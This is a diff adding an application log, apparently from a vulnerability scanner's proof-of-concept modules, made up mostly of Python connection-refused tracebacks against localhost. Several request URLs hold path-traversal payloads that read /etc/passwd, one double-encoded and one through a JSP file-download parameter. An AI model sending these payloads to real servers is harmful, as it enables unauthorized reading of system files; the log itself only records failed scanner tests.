@@ -1,0 +1,265 @@
+[DEBUG] [2022-10-12 21:31:46,300] [Log2.py] [<module>] [99] > debug
+[INFO] [2022-10-12 21:31:46,301] [Log2.py] [<module>] [100] > info
+[WARNING] [2022-10-12 21:31:46,301] [Log2.py] [<module>] [101] > warn
+[ERROR] [2022-10-12 21:31:46,301] [Log2.py] [<module>] [102] > error
+[CRITICAL] [2022-10-12 21:31:46,301] [Log2.py] [<module>] [103] > critical
+[ERROR] [2022-10-12 21:39:43,663] [Log.py] [<module>] [109] > test
+[ERROR] [2022-10-12 21:39:43,663] [Log.py] [<module>] [109] > test
+[ERROR] [2022-10-12 21:41:36,508] [Log.py] [<module>] [109] > test
+[ERROR] [2022-10-12 21:44:30,519] [MongoDB.py] [insert_data] [33] > Failed to insert data to mongodb. 10.10.20.50:27017: timed out, Timeout: 0.3s, Topology Description: <TopologyDescription id: 6346c4bea34b6c877fd03c85, topology_type: Unknown, servers: [<ServerDescription ('10.10.20.50', 27017) server_type: Unknown, rtt: None, error=NetworkTimeout('10.10.20.50:27017: timed out')>]>
+[ERROR] [2022-10-12 21:57:18,982] [v_2022_0001_VSCC.py] [verify] [65] > 127.0.0.1 - v_2022_0001 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x0000022663535C10>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000022663535C10>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0001_VSCC.py", line 54, in verify
+    response = requests.get(url + payload,headers=headers,timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000022663535C10>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[ERROR] [2022-10-12 21:57:18,986] [v_2022_0002_CSXS.py] [verify] [62] > 127.0.0.1 - v_2022_0002 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x0000022663535B20>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000022663535B20>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0002_CSXS.py", line 54, in verify
+    response = requests.get(url+payload, headers=headers, timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000022663535B20>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[ERROR] [2022-10-12 21:59:20,884] [v_2022_0001_VSCC.py] [verify] [65] > 127.0.0.1 - v_2022_0001 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x000002377CCEC2E0>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000002377CCEC2E0>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0001_VSCC.py", line 54, in verify
+    response = requests.get(url + payload,headers=headers,timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000002377CCEC2E0>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[ERROR] [2022-10-12 21:59:20,896] [v_2022_0002_CSXS.py] [verify] [62] > 127.0.0.1 - v_2022_0002 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x000002377CCEC1F0>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000002377CCEC1F0>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0002_CSXS.py", line 54, in verify
+    response = requests.get(url+payload, headers=headers, timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000002377CCEC1F0>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
